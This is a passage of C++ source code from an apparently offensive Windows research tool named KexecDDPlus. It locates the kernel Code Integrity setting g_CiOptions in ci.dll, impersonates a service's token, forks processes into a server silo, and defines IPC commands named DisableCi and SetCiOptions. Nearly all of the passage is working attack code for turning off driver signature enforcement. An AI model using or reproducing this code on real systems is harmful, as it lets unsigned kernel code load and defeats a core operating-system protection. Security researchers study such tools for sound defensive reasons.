    if (!Common::FindModuleSection(hModule, ".text", section)) goto exit;

    if (!(pCiInitialize = GetProcAddress(hModule, "CiInitialize")))
    {
        PRINT_ERROR_WIN32(L"GetProcAddress");
        goto exit;
    }

    //PRINT_VERBOSE(L"CiInitialize @ 0x%llx\n", (ULONG_PTR)pCiInitialize);

    for (DWORD i = 0; i < 128; i++)
    {
        LONG lRelativeOffset; // RIP-relative offset can be negative!
        ULONG_PTR pCallTarget, pCiOptions;

        // Is it a potential "CALL near" instruction?
        // E8 XX XX XX XX, where XX XX XX XX is a RIP-relative offset (x86_64)
        if (((PBYTE)pCiInitialize)[i] == 0xe8)
        {
            __try
            {
                // We found a potential CALL instruction, so let's extract the next
                // 4 bytes to calculate the RIP-relative address of the target function.
                memcpy(&lRelativeOffset, &(((PBYTE)pCiInitialize)[i + 1]), sizeof(lRelativeOffset));
                pCallTarget = (ULONG_PTR) & ((PBYTE)pCiInitialize)[i + 5] + (LONGLONG)lRelativeOffset;

                // Now, read up to 128 bytes of memory starting from the address of the
                // target function, and try to find the expected MOV instruction.
                for (DWORD j = 0; j < 128; j++)
                {
                    // Is it a potential "MOV dword ptr [xxx], ecx" instruction?
                    // 89 0D XX XX XX XX, where XX XX XX XX is a RIP-relative offset (x86_64)
                    if (((PBYTE)pCallTarget)[j] == 0x89 && ((PBYTE)pCallTarget)[j + 1] == 0x0d)
                    {
                        // We may have found the MOV instruction we were looking for, so let's extract
                        // the next 4 bytes and calculates the RIP-relative address of the target pointer.
                        memcpy(&lRelativeOffset, &((PBYTE)pCallTarget)[j + 2], sizeof(lRelativeOffset));
                        pCiOptions = (ULONG_PTR) & ((PBYTE)pCallTarget)[j + 6] + (LONGLONG)lRelativeOffset;

                        // Check whether the target address is within a writable memory range. If so, we
                        // are quiet sure we found the correct address/offset. Otherwise, we are sure the
                        // address/offset is incorrect, and we should exit gracefully to avoid causing
                        // a BSOD at a further time because of an illegal memory write.
                        if (Common::IsWritableAddress(hModule, pCiOptions))
                        {
                            *Offset = (DWORD)(pCiOptions - (ULONG_PTR)hModule);
                            bResult = TRUE;
                        }
                        else
                        {
                            PRINT_ERROR(L"Address 0x%llx not within a writeable memory range!\n", pCiOptions);
                        }
                    }

                    if (*Offset) break;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                PRINT_WARNING(L"Exception while accessing memory (err=0x%08x)\n", GetExceptionCode());
            }
        }

        if (*Offset) break;
    }

exit:
    if (hModule) FreeLibrary(hModule);
    if (!bResult) PRINT_ERROR(L"Cound not find offset of global variable g_CiOptions in module 'ci.dll'.\n");

    return bResult;
}

BOOL Common::EnablePrivilege(_In_opt_ HANDLE Token, _In_ LPCWSTR Privilege)
{
    BOOL bResult = FALSE, bPrivilegeFound = FALSE;
    HANDLE hToken = NULL;
    DWORD dwTokenInfoSize, dwPrivilegeNameLength;
    PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
    LUID_AND_ATTRIBUTES laa = { 0 };
    LPWSTR pwszPrivilegeNameTemp = NULL;
    TOKEN_PRIVILEGES tp = { 0 };

    if (Token)
    {
        hToken = Token;
    }
    else
    {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
        {
            PRINT_ERROR_WIN32(L"OpenProcessToken");
            goto exit;
        }
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwTokenInfoSize))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            PRINT_ERROR_WIN32(L"GetTokenInformation");
            goto exit;
        }
    }

    if (!(pTokenPrivileges = (PTOKEN_PRIVILEGES)Common::Alloc(dwTokenInfoSize))) goto exit;

    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenInfoSize, &dwTokenInfoSize))
    {
        PRINT_ERROR_WIN32(L"GetTokenInformation");
        goto exit;
    }

    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
    {
        laa = pTokenPrivileges->Privileges[i];
        dwPrivilegeNameLength = 0;

        if (!LookupPrivilegeNameW(NULL, &(laa.Luid), NULL, &dwPrivilegeNameLength))
        {
            if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
            {
                PRINT_ERROR_WIN32(L"LookupPrivilegeNameW");
                goto exit;
            }
        }

        dwPrivilegeNameLength += 1;

        if (pwszPrivilegeNameTemp = (LPWSTR)Common::Alloc(dwPrivilegeNameLength * sizeof(*pwszPrivilegeNameTemp)))
        {
            if (LookupPrivilegeNameW(NULL, &(laa.Luid), pwszPrivilegeNameTemp, &dwPrivilegeNameLength))
            {
                if (_wcsicmp(pwszPrivilegeNameTemp, Privilege) == 0)
                {
                    bPrivilegeFound = TRUE;

                    ZeroMemory(&tp, sizeof(tp));
                    tp.PrivilegeCount = 1;
                    tp.Privileges[0].Luid = laa.Luid;
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
                        bResult = TRUE;
                    else
                        PRINT_ERROR_WIN32(L"AdjustTokenPrivileges");
                        

                    
                    break;
                    
                }
            }
            else
            {
                PRINT_ERROR_WIN32(L"LookupPrivilegeNameW");
            }

            Common::Free(pwszPrivilegeNameTemp);
        }
    }

exit:
    if (!bPrivilegeFound)
    {
        SetLastError(ERROR_PRIVILEGE_NOT_HELD);
        PRINT_ERROR_WIN32(L"EnablePrivilege");
    }
    
    if (pTokenPrivileges) Common::Free(pTokenPrivileges);
    if (!Token && hToken) CloseHandle(hToken);

    return bResult;
}

BOOL Common::QueryServiceProcessId(_In_ LPCWSTR Service, _Out_ PDWORD ProcessId)
{
    BOOL bResult = FALSE;
    SC_HANDLE hSCM = NULL, hService = NULL;
    SERVICE_STATUS_PROCESS ssp = { 0 };
    DWORD dwBytesNeeded = 0;

    *ProcessId = 0;

    if (!(hSCM = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)))
    {
        PRINT_ERROR_WIN32(L"OpenSCManagerW");
        goto exit;
    }

    if (!(hService = OpenServiceW(hSCM, Service, SERVICE_QUERY_STATUS)))
    {
        PRINT_ERROR_WIN32(L"OpenServiceW");
        goto exit;
    }

    if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &dwBytesNeeded))
    {
        PRINT_ERROR_WIN32(L"QueryServiceStatusEx");
        goto exit;
    }

    *ProcessId = ssp.dwProcessId;
    bResult = TRUE;

exit:
    if (hService) CloseServiceHandle(hService);
    if (hSCM) CloseServiceHandle(hSCM);

    return bResult;
}

BOOL Common::OpenServiceToken(_In_ LPCWSTR Service, _Out_ PHANDLE Token)
{
    BOOL bResult = FALSE, bImpersonation = FALSE;
    NTSTATUS status;
    DWORD dwServicePid = 0;
    HANDLE hThread = NULL, hToken = NULL;
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    THREADENTRY32 the = { 0 };
    SECURITY_QUALITY_OF_SERVICE sqos = { 0 };

    *Token = NULL;

    if (!Common::QueryServiceProcessId(Service, &dwServicePid)) goto exit;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        PRINT_ERROR_WIN32(L"CreateToolhelp32Snapshot");
        goto exit;
    }

    the.dwSize = sizeof(the);

    if (!Thread32First(hSnapshot, &the))
    {
        PRINT_ERROR_WIN32(L"Thread32First");
        goto exit;
    }

    do
    {
        if (the.th32OwnerProcessID == dwServicePid)
        {
            if (hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, the.th32ThreadID))
                break;
        }

    } while (Thread32Next(hSnapshot, &the));

    if (!hThread)
    {
        PRINT_ERROR_WIN32(L"OpenThread");
        goto exit;
    }

    ZeroMemory(&sqos, sizeof(sqos));
    sqos.Length = sizeof(sqos);
    sqos.ImpersonationLevel = SecurityImpersonation;

    status = NtImpersonateThread(GetCurrentThread(), hThread, &sqos);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtImpersonateThread", status);
        goto exit;
    }

    bImpersonation = TRUE;

    if (!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hToken))
    {
        PRINT_ERROR_WIN32(L"OpenThreadToken");
        goto exit;
    }

    *Token = hToken;
    bResult = TRUE;

exit:
    if (!bResult && hToken) CloseHandle(hToken);
    if (bImpersonation) RevertToSelf();
    if (hThread) CloseHandle(hThread);
    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);

    return bResult;
}

BOOL Common::ImpersonateToken(_In_ HANDLE Token)
{
    HANDLE hThread = GetCurrentThread();

    if (!SetThreadToken(&hThread, Token))
    {
        PRINT_ERROR_WIN32(L"SetThreadToken");
        return FALSE;
    }

    return TRUE;
}

BOOL Common::RevertImpersonation()
{
    if (!RevertToSelf())
    {
        PRINT_ERROR_WIN32(L"RevertToSelf");
        return FALSE;
    }

    return TRUE;
}

BOOL Common::ForkProcessIntoServerSilo(_In_ HANDLE ServerSilo, _Out_ LPPROCESS_INFORMATION ProcessInformation)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    HANDLE hJobList[1] = { 0 };
    HANDLE hProcess, hThread;
    PS_CREATE_INFO ci = { 0 };
    PPS_ATTRIBUTE_LIST pAttributeList = NULL;
    const DWORD dwAttributeCount = 1;
    const SIZE_T attributeListSize = sizeof(PS_ATTRIBUTE_LIST) + ((SIZE_T)dwAttributeCount - 1) * sizeof(PS_ATTRIBUTE);

    *ProcessInformation = { 0 };

    ci.Size = sizeof(ci);

    if (!(pAttributeList = (PPS_ATTRIBUTE_LIST)Common::Alloc(attributeListSize))) goto exit;

    hJobList[0] = ServerSilo;

    pAttributeList->TotalLength = attributeListSize;

    pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_JOB_LIST;
    pAttributeList->Attributes[0].Size = sizeof(hJobList);
    pAttributeList->Attributes[0].ValuePtr = &hJobList;

    status = NtCreateUserProcess(&hProcess, &hThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, NULL, &ci, pAttributeList);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtCreateUserProcess", status);
        goto exit;
    }

    if (status == STATUS_SUCCESS)
    {
        // Parent process
        ProcessInformation->hProcess = hProcess;
        ProcessInformation->hThread = hThread;
        ProcessInformation->dwProcessId = GetProcessId(hProcess);
        ProcessInformation->dwThreadId = GetProcessId(hProcess);
        bResult = TRUE;
    }
    else if (status == STATUS_PROCESS_CLONED)
    {
        // Forked process
        bResult = TRUE;
    }
    else
    {
        // ??? Oo
        PRINT_WARNING(L"Unexpected status code: 0x%08x\n", status);
    }

exit:
    if (pAttributeList) Common::Free(pAttributeList);

    return bResult;
}
```

`Common/common.h`:

```h
#pragma once

#include "nt.h"
#include <Windows.h>
#include <vector>

#define PAGE_SIZE 0x1000
#define WIDEH(x) L##x
#define WIDE(x) WIDEH(x)
#define PRINT_VERBOSE_FORMAT_A(f) "[*][%s] " f
#define PRINT_VERBOSE_FORMAT_U(f) WIDE(PRINT_VERBOSE_FORMAT_A(f))
#define PRINT_VERBOSE_A(format, ...) if (g_bPrintVerbose) { printf( PRINT_VERBOSE_FORMAT_A(format), __FUNCTION__, __VA_ARGS__ ); }
#define PRINT_VERBOSE(format, ...) if (g_bPrintVerbose) { wprintf( PRINT_VERBOSE_FORMAT_U(format), WIDE(__FUNCTION__), __VA_ARGS__ ); }
#define PRINT_ERROR_FORMAT_A(f) "[-][%s] " f
#define PRINT_ERROR_FORMAT_U(f) WIDE(PRINT_ERROR_FORMAT_A(f))
#define PRINT_ERROR_A(format, ...) printf( PRINT_ERROR_FORMAT_A(format), __FUNCTION__, __VA_ARGS__ )
#define PRINT_ERROR(format, ...) wprintf( PRINT_ERROR_FORMAT_U(format), WIDE(__FUNCTION__), __VA_ARGS__ )
#define PRINT_ERROR_WIN32(func) { PRINT_ERROR( "%ws failed, err=%d - ", func, GetLastError()); Common::PrintSystemError(GetLastError()); }
#define PRINT_ERROR_NT(func, status) { PRINT_ERROR( "%ws failed, err=0x%08x (%d) - ", func, status, RtlNtStatusToDosError(status)); Common::PrintSystemError(RtlNtStatusToDosError(status)); }
#define PRINT_WARNING_FORMAT_A(f) "[!] " f
#define PRINT_WARNING_FORMAT_U(f) WIDE(PRINT_WARNING_FORMAT_A(f))
#define PRINT_WARNING_A(format, ...) printf( PRINT_WARNING_FORMAT_A(format), __VA_ARGS__ )
#define PRINT_WARNING(format, ...) wprintf( PRINT_WARNING_FORMAT_U(format), __VA_ARGS__ )
#define PRINT_SUCCESS_FORMAT_A(f) "[+] " f
#define PRINT_SUCCESS_FORMAT_U(f) WIDE(PRINT_SUCCESS_FORMAT_A(f))
#define PRINT_SUCCESS_A(format, ...) printf( PRINT_SUCCESS_FORMAT_A(format), __VA_ARGS__ )
#define PRINT_SUCCESS(format, ...) wprintf( PRINT_SUCCESS_FORMAT_U(format), __VA_ARGS__ )

extern BOOL g_bPrintVerbose;

namespace Common
{
    class ImageSectionHeaderInfo
    {
    public:
        CHAR Name[9];
        DWORD VirtualAddress;
        DWORD VirtualSize;
        DWORD Characteristics;
    };

    VOID PrintSystemError(_In_ DWORD ErrorCode);
    LPVOID Alloc(_In_ SIZE_T Size);
    BOOL Free(_In_ LPVOID Mem);

    BOOL FindKernelModuleBaseAddress(_In_ LPCSTR ModuleName, _Inout_ PULONG_PTR ModuleAddress);
    BOOL EnumModuleSections(_In_ HMODULE Module, _Inout_ std::vector<ImageSectionHeaderInfo>& SectionList);
    BOOL FindModuleSection(_In_ HMODULE Module, _In_ LPCSTR SectionName, _Inout_ ImageSectionHeaderInfo& Section);
    BOOL IsWritableAddress(_In_ HMODULE Module, _In_ ULONG_PTR Address);
    BOOL FindPatternOffset(_In_ LPVOID Buffer, _In_ DWORD BufferSize, _In_ PBYTE Pattern, _In_ DWORD PatternSize, _Out_ PDWORD PatternOffset);
    BOOL FindGadgetOffset(_In_ LPCWSTR Module, _In_ PBYTE Gadget, _In_ DWORD GadgetSize, _Out_ PDWORD GadgetOffset);
    BOOL FindCiOptionsOffset(_Out_ PDWORD Offset);

    BOOL EnablePrivilege(_In_opt_ HANDLE Token, _In_ LPCWSTR Privilege);
    BOOL QueryServiceProcessId(_In_ LPCWSTR Service, _Out_ PDWORD ProcessId);
    BOOL OpenServiceToken(_In_ LPCWSTR Service, _Out_ PHANDLE Token);
    BOOL ImpersonateToken(_In_ HANDLE Token);
    BOOL RevertImpersonation();

    BOOL ForkProcessIntoServerSilo(_In_ HANDLE ServerSilo, _Out_ LPPROCESS_INFORMATION ProcessInformation);
}
```

`Common/ipc.h`:

```h
#pragma once

#include "common.h"
#include <assert.h>

#define IPC_NAMED_PIPE_NAME L"KexecDDPlus"

enum class MessageType
{
    Ping = 1,
    StopServer,
    QueryCiOptions,
    DisableCi,
    SetCiOptions,
    MaxValue,
};

typedef struct _IPC_REQUEST_HEADER
{
    DWORD Type;
} IPC_REQUEST_HEADER, *PIPC_REQUEST_HEADER;
static_assert(sizeof(IPC_REQUEST_HEADER) < PAGE_SIZE, L"The size of IPC_REQUEST_HEADER is greater than PAGE_SIZE.");

typedef struct _IPC_RESPONSE_HEADER
{
    DWORD Type;
    BOOL Result;
    DWORD Status;
} IPC_RESPONSE_HEADER, *PIPC_RESPONSE_HEADER;
static_assert(sizeof(IPC_RESPONSE_HEADER) < PAGE_SIZE, L"The size of IPC_RESPONSE_HEADER is greater than PAGE_SIZE.");

typedef struct _IPC_REQUEST_PING
{
    IPC_REQUEST_HEADER Header;
    WCHAR Message[5];
} IPC_REQUEST_PING, *PIPC_REQUEST_PING;
static_assert(sizeof(IPC_REQUEST_PING) < PAGE_SIZE, L"The size of IPC_REQUEST_PING is greater than PAGE_SIZE.");

typedef struct _IPC_RESPONSE_PING
{
    IPC_RESPONSE_HEADER Header;
    WCHAR Message[5];
} IPC_RESPONSE_PING, *PIPC_RESPONSE_PING;
static_assert(sizeof(IPC_RESPONSE_PING) < PAGE_SIZE, L"The size of IPC_RESPONSE_PING is greater than PAGE_SIZE.");

typedef struct _IPC_REQUEST_STOP_SERVER
{
    IPC_REQUEST_HEADER Header;
} IPC_REQUEST_STOP_SERVER, *PIPC_REQUEST_STOP_SERVER;
static_assert(sizeof(IPC_REQUEST_STOP_SERVER) < PAGE_SIZE, L"The size of IPC_REQUEST_STOP_SERVER is greater than PAGE_SIZE.");

typedef struct _IPC_RESPONSE_STOP_SERVER
{
    IPC_RESPONSE_HEADER Header;
} IPC_RESPONSE_STOP_SERVER, *PIPC_RESPONSE_STOP_SERVER;
static_assert(sizeof(IPC_RESPONSE_STOP_SERVER) < PAGE_SIZE, L"The size of IPC_RESPONSE_STOP_SERVER is greater than PAGE_SIZE.");

typedef struct _IPC_REQUEST_QUERY_CI_OPTIONS
{
    IPC_REQUEST_HEADER Header;
} IPC_REQUEST_QUERY_CI_OPTIONS, *PIPC_REQUEST_QUERY_CI_OPTIONS;
static_assert(sizeof(IPC_REQUEST_QUERY_CI_OPTIONS) < PAGE_SIZE, L"The size of IPC_REQUEST_QUERY_CI_OPTIONS is greater than PAGE_SIZE.");

typedef struct _IPC_RESPONSE_QUERY_CI_OPTIONS
{
    IPC_RESPONSE_HEADER Header;
    DWORD CiOptions;
} IPC_RESPONSE_QUERY_CI_OPTIONS, *PIPC_RESPONSE_QUERY_CI_OPTIONS;
static_assert(sizeof(IPC_RESPONSE_QUERY_CI_OPTIONS) < PAGE_SIZE, L"The size of IPC_RESPONSE_QUERY_CI_OPTIONS is greater than PAGE_SIZE.");

typedef struct _IPC_REQUEST_DISABLE_CI
{
    IPC_REQUEST_HEADER Header;
} IPC_REQUEST_DISABLE_CI, *PIPC_REQUEST_DISABLE_CI;
static_assert(sizeof(IPC_REQUEST_DISABLE_CI) < PAGE_SIZE, L"The size of IPC_REQUEST_DISABLE_CI is greater than PAGE_SIZE.");

typedef struct _IPC_RESPONSE_DISABLE_CI
{
    IPC_RESPONSE_HEADER Header;
} IPC_RESPONSE_DISABLE_CI, *PIPC_RESPONSE_DISABLE_CI;
static_assert(sizeof(IPC_RESPONSE_DISABLE_CI) < PAGE_SIZE, L"The size of IPC_RESPONSE_DISABLE_CI is greater than PAGE_SIZE.");

typedef struct _IPC_REQUEST_SET_CI_OPTIONS
{
    IPC_REQUEST_HEADER Header;
    DWORD CiOptions;
} IPC_REQUEST_SET_CI_OPTIONS, *PIPC_REQUEST_SET_CI_OPTIONS;
static_assert(sizeof(IPC_REQUEST_SET_CI_OPTIONS) < PAGE_SIZE, L"The size of IPC_REQUEST_SET_CI_OPTIONS is greater than PAGE_SIZE.");

typedef struct _IPC_RESPONSE_SET_CI_OPTIONS
{
    IPC_RESPONSE_HEADER Header;
} IPC_RESPONSE_SET_CI_OPTIONS, *PIPC_RESPONSE_SET_CI_OPTIONS;
static_assert(sizeof(IPC_RESPONSE_SET_CI_OPTIONS) < PAGE_SIZE, L"The size of IPC_RESPONSE_SET_CI_OPTIONS is greater than PAGE_SIZE.");

```

`Common/nt.h`:

```h
#pragma once
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_PROCESS_CLONED ((NTSTATUS)0x00000129L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

// https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntexapi.h
// SYSTEM_INFORMATION_CLASS
#define SystemModuleInformation 11

// https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntioapi.h
// FILE_INFORMATION_CLASS (undocumented)
#define FileIoCompletionNotificationInformation 41

// https://github.com/winsiderss/phnt/blob/master/ntpsapi.h
// PS_ATTRIBUTE_NUM (undocumented)
#define PsAttributeStdHandleInfo 10
#define PsAttributeJobList 19

// https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004 // NtCreateProcessEx & NtCreateUserProcess

// https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
// JOBOBJECTINFOCLASS (undocumented)
#define JobObjectSiloRootDirectory 37 // 0x25 - SILOOBJECT_ROOT_DIRECTORY
#define JobObjectServerSiloInitialize 40 // 0x28 - SERVERSILO_INIT_INFORMATION
#define JobObjectContainerTelemetryId 44 // 0x2c
#define JobObjectSiloSystemRoot 45 // 0x2d

// https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
// Job extended limits (undocumented)
#define JOB_OBJECT_LIMIT_SILO_READY 0x00400000

// https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
#define SILO_OBJECT_ROOT_DIRECTORY_SHADOW_ROOT 0x00000001
#define SILO_OBJECT_ROOT_DIRECTORY_INITIALIZE 0x00000002
#define SILO_OBJECT_ROOT_DIRECTORY_SHADOW_DOS_DEVICES 0x00000004
#define SILO_OBJECT_ROOT_DIRECTORY_ALL SILO_OBJECT_ROOT_DIRECTORY_SHADOW_ROOT | SILO_OBJECT_ROOT_DIRECTORY_INITIALIZE | SILO_OBJECT_ROOT_DIRECTORY_SHADOW_DOS_DEVICES

// https://github.com/winsiderss/phnt/blob/master/ntpsapi.h
#define PS_ATTRIBUTE_NUMBER_MASK 0x0000ffff
#define PS_ATTRIBUTE_THREAD 0x00010000 // may be used with thread creation
#define PS_ATTRIBUTE_INPUT 0x00020000 // input only
#define PS_ATTRIBUTE_ADDITIVE 0x00040000 // "accumulated" e.g. bitmasks, counters, etc.

// https://github.com/winsiderss/phnt/blob/master/ntpsapi.h
#define PsAttributeValue(Number, Thread, Input, Additive) \
    (((Number) & PS_ATTRIBUTE_NUMBER_MASK) | \
    ((Thread) ? PS_ATTRIBUTE_THREAD : 0) | \
    ((Input) ? PS_ATTRIBUTE_INPUT : 0) | \
    ((Additive) ? PS_ATTRIBUTE_ADDITIVE : 0))

// https://github.com/winsiderss/phnt/blob/master/ntpsapi.h
#define PS_ATTRIBUTE_JOB_LIST \
    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)

#ifdef __cplusplus
extern "C" {
#endif

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntldr.h
    typedef struct _RTL_PROCESS_MODULE_INFORMATION
    {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntldr.h
    typedef struct _RTL_PROCESS_MODULES
    {
        ULONG NumberOfModules;
        RTL_PROCESS_MODULE_INFORMATION Modules[1];
    } RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
    typedef struct _PS_ATTRIBUTE
    {
        ULONG_PTR Attribute;
        SIZE_T Size;
        union
        {
            ULONG_PTR Value;
            PVOID ValuePtr;
        };
        PSIZE_T ReturnLength;
    } PS_ATTRIBUTE, * PPS_ATTRIBUTE;

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
    typedef struct _PS_ATTRIBUTE_LIST
    {
        SIZE_T TotalLength;
        PS_ATTRIBUTE Attributes[1];
    } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
    typedef struct _PS_STD_HANDLE_INFO
    {
        union
        {
            ULONG Flags;
            struct
            {
                ULONG StdHandleState : 2; // PS_STD_HANDLE_STATE
                ULONG PseudoHandleMask : 3; // PS_STD_*
            };
        };
        ULONG StdHandleSubsystemType;
    } PS_STD_HANDLE_INFO, * PPS_STD_HANDLE_INFO;

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
    typedef enum _PS_STD_HANDLE_STATE
    {
        PsNeverDuplicate,
        PsRequestDuplicate, // duplicate standard handles specified by PseudoHandleMask, and only if StdHandleSubsystemType matches the image subsystem
        PsAlwaysDuplicate, // always duplicate standard handles
        PsMaxStdHandleStates
    } PS_STD_HANDLE_STATE;

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
    typedef enum _PS_CREATE_STATE
    {
        PsCreateInitialState,
        PsCreateFailOnFileOpen,
        PsCreateFailOnSectionCreate,
        PsCreateFailExeFormat,
        PsCreateFailMachineMismatch,
        PsCreateFailExeName, // Debugger specified
        PsCreateSuccess,
        PsCreateMaximumStates
    } PS_CREATE_STATE;

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
    typedef struct _PS_CREATE_INFO
    {
        SIZE_T Size;
        PS_CREATE_STATE State;
        union
        {
            // PsCreateInitialState
            struct
            {
                union
                {
                    ULONG InitFlags;
                    struct
                    {
                        UCHAR WriteOutputOnExit : 1;
                        UCHAR DetectManifest : 1;
                        UCHAR IFEOSkipDebugger : 1;
                        UCHAR IFEODoNotPropagateKeyState : 1;
                        UCHAR SpareBits1 : 4;
                        UCHAR SpareBits2 : 8;
                        USHORT ProhibitedImageCharacteristics : 16;
                    };
                };
                ACCESS_MASK AdditionalFileAccess;
            } InitState;

            // PsCreateFailOnSectionCreate
            struct
            {
                HANDLE FileHandle;
            } FailSection;

            // PsCreateFailExeFormat
            struct
            {
                USHORT DllCharacteristics;
            } ExeFormat;

            // PsCreateFailExeName
            struct
            {
                HANDLE IFEOKey;
            } ExeName;

            // PsCreateSuccess
            struct
            {
                union
                {
                    ULONG OutputFlags;
                    struct
                    {
                        UCHAR ProtectedProcess : 1;
                        UCHAR AddressSpaceOverride : 1;
                        UCHAR DevOverrideEnabled : 1; // from Image File Execution Options
                        UCHAR ManifestDetected : 1;
                        UCHAR ProtectedProcessLight : 1;
                        UCHAR SpareBits1 : 3;
                        UCHAR SpareBits2 : 8;
                        USHORT SpareBits3 : 16;
                    };
                };
                HANDLE FileHandle;
                HANDLE SectionHandle;
                ULONGLONG UserProcessParametersNative;
                ULONG UserProcessParametersWow64;
                ULONG CurrentParameterFlags;
                ULONGLONG PebAddressNative;
                ULONG PebAddressWow64;
                ULONGLONG ManifestAddress;
                ULONG ManifestSize;
            } SuccessState;
        };
    } PS_CREATE_INFO, * PPS_CREATE_INFO;

#define FILE_SKIP_COMPLETION_PORT_ON_SUCCESS 0x1
#define FILE_SKIP_SET_EVENT_ON_HANDLE 0x2
#define FILE_SKIP_SET_USER_EVENT_ON_FAST_IO 0x4

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntioapi.h
    typedef struct _FILE_IO_COMPLETION_NOTIFICATION_INFORMATION
    {
        ULONG Flags;
    } FILE_IO_COMPLETION_NOTIFICATION_INFORMATION, * PFILE_IO_COMPLETION_NOTIFICATION_INFORMATION;

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
    typedef struct _SILOOBJECT_ROOT_DIRECTORY
    {
        union
        {
            ULONG ControlFlags; // SILO_OBJECT_ROOT_DIRECTORY_*
            UNICODE_STRING Path;
        };
    } SILOOBJECT_ROOT_DIRECTORY, * PSILOOBJECT_ROOT_DIRECTORY;

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
    typedef struct _SERVERSILO_INIT_INFORMATION
    {
        HANDLE DeleteEvent;
        BOOLEAN IsDownlevelContainer;
    } SERVERSILO_INIT_INFORMATION, * PSERVERSILO_INIT_INFORMATION;

    // https://github.com/winsiderss/phnt/blob/master/ntpsapi.h
    typedef struct _JOBOBJECT_EXTENDED_LIMIT_INFORMATION_V2
    {
        JOBOBJECT_BASIC_LIMIT_INFORMATION BasicLimitInformation;
        IO_COUNTERS IoInfo;
        SIZE_T ProcessMemoryLimit;
        SIZE_T JobMemoryLimit;
        SIZE_T PeakProcessMemoryUsed;
        SIZE_T PeakJobMemoryUsed;
        SIZE_T JobTotalMemoryLimit;
    } JOBOBJECT_EXTENDED_LIMIT_INFORMATION_V2, * PJOBOBJECT_EXTENDED_LIMIT_INFORMATION_V2;

    _Success_(return != 0)
        _Must_inspect_result_
        NTSYSAPI
        BOOLEAN
        NTAPI
        RtlCreateUnicodeString(
            _Out_ PUNICODE_STRING DestinationString,
            _In_z_ PCWSTR SourceString
        );

    NTSYSAPI
        PIMAGE_NT_HEADERS
        NTAPI
        RtlImageNtHeader(
            IN      PVOID               ModuleAddress
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtCreateUserProcess(
            _Out_ PHANDLE ProcessHandle,
            _Out_ PHANDLE ThreadHandle,
            _In_ ACCESS_MASK ProcessDesiredAccess,
            _In_ ACCESS_MASK ThreadDesiredAccess,
            _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,
            _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,
            _In_ ULONG ProcessFlags, // PROCESS_CREATE_FLAGS_*
            _In_ ULONG ThreadFlags, // THREAD_CREATE_FLAGS_*
            _In_opt_ PVOID ProcessParameters, // PRTL_USER_PROCESS_PARAMETERS
            _Inout_ PPS_CREATE_INFO CreateInfo,
            _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
        );

    // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
    NTSYSCALLAPI
        NTSTATUS
        NTAPI
